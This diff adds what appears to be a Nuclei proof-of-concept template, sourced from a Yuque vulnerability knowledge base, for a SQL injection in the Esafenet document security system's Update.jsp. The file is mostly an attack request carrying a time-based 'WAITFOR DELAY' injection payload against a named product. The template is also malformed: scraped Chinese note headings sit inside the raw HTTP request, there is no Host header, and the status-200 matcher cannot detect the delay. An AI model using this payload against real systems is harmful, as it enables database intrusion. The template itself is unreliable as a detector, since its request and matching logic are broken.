@@ -1,0 +1,34 @@
+id: poc-qodpa9l4utix6vtc
+info:
+  name: 亿赛通电子文档安全管理系统 Update.jsp SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qodpa9l4utix6vtc'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qodpa9l4utix6vtc
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
